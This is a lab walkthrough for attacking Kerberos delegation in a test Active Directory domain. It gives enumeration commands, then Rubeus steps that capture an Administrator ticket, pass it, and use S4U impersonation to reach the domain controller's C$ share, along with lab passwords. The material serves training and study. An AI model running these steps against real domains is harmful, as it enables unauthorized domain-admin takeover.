
# Scenario

> The lab always requires some domain user credential material or Administrative priviledges on a particular machine. For a particular vulnerability we simply consider the assumptions for individual attacks.

---

# Kerberos Unconstrained Delegation(KUD) - Computer 

Assumption, we have compromised `domuser@red.local` who is a local administrator on the `WEBSRV` machine and the `WEBSRV` machine is `TrustedForDelegation`. 

## Enumeration

1. ADModule

```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll

Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```
![](/docs/assets/images/KUD-1.png)

2. ADSearch

```bash
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```
![](/docs/assets/images/KUD-2.png)

3. PowerView

```powershell
. .\PowerView.ps1

Get-NetComputer -Unconstrained | select dnshostname,samaccountname
```
![](/docs/assets/images/KUD-3.png)

4. Impacket

```bash
findDelegation.py red.local/domuser:'P@ssw0rd1!' -target-domain red.local
```
![](/docs/assets/images/KUD-4.png)

## Exploitation

1. Try listing the C$ on the DC to confirm we don't have administrator privileges on the DC

```bash
dir \\dc01\c$
```
![](/docs/assets/images/KUD-5.png)

2. Run `Rubeus.exe` to view the tickets.

```bash
.\Rubeus.exe triage

klist
```
![](/docs/assets/images/KUD-6.png)
![](/docs/assets/images/KUD-7.png)


3. On websrv run the following to capture TGTs and observe the response in Rubeus

```bash
.\Rubeus.exe monitor /monitorinterval:10 /filteruser:Administrator /nowrap
```

4. Logon to the DC and list the C$ on webserver.

```bash
whoami

hostname

dir \\websrv.red.local\c$
```

![](/docs/assets/images/KUD-8.png)

![](/docs/assets/images/KUD-9.png)


5. Use Rubues.exe ptt module

```bash
.\Rubeus.exe ptt /ticket:<base64-ticket>
klist
```

![](/docs/assets/images/KUD-10.png)

![](/docs/assets/images/KUD-11.png)


6. Try listing the C$ on the DC now to confirm that we have Administrator Credential material.

```
dir \\dc01\c$
```

![](/docs/assets/images/KUD-12.png)

----

# Kerberos Constrained Delegation - User

## Enumeration

1. ADModule

```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
![](/docs/assets/images/KCD-1.png)

2. ADSearch

```bash
.\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes samaccountname
```
![](/docs/assets/images/KCD-2.png)

3. PowerView

```powershell
. .\PowerView.ps1

Get-NetUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```
![](/docs/assets/images/KCD-3.png)

4. Impacket

```bash
findDelegation.py red.local/domuser:'P@ssw0rd1!' -target-domain red.local
```
![](/docs/assets/images/KUD-4.png)

## Exploitation

1. Use `Rubeus.exe` to generate the users `rc4` hash

```bash
.\Rubeus.exe hash /user:"prod_svc" /password:"P@ss123!" /domain:"red.local"
```

![](/docs/assets/images/KCD-4.png)

2. Use `Rubues.exe` s4u module to impersonate the Administrator 

```bash
.\Rubeus.exe s4u /domain:"red.local" /user:"prod_svc" /rc4:5AF33376FB21C57A84F3066E7CFBDECC /impersonateuser:"Administrator" /msdsspn:"cifs/dc01" /nowrap /ptt

klist
```

![](/docs/assets/images/KCD-5.png)

![](/docs/assets/images/KCD-6.png)

3. List the `C$` share on the DC.

```bash
dir \\dc01\c$
```

